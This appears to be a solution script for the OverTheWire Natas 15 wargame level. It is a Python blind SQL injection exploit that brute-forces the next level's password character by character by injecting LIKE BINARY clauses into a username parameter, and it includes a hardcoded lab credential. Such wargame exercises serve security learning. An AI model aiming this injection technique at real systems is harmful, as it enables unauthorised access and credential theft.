import requests

target = 'http://natas15.natas.labs.overthewire.org'
charset = "0123456789" + "abcdefghijklmnopqrstuvwxyz" + "ABCDEFGHIJKLMNOPQRSTUVWXYZ"

filtered=""


for char in charset:
    username = ('natas16" AND password LIKE BINARY "%' + char + '%" #')
    r = requests.post(target, auth=('natas15', 'TTkaI7AWG4iDERztBcEyKV7kRXH1EZRB'), params={"username": username})
    if "This user exists." in r.text:
        filtered += char
        print(filtered)

passwd=""

for i in range(32):
    for char in filtered:
        username = ('natas16" AND password LIKE BINARY "' + passwd + char + '%" #')
        r = requests.post(target, auth=('natas15', 'TTkaI7AWG4iDERztBcEyKV7kRXH1EZRB'), params={"username": username})
        if "This user exists." in r.text:
            passwd += char
            print(passwd + ("*" * (32 - len(passwd))))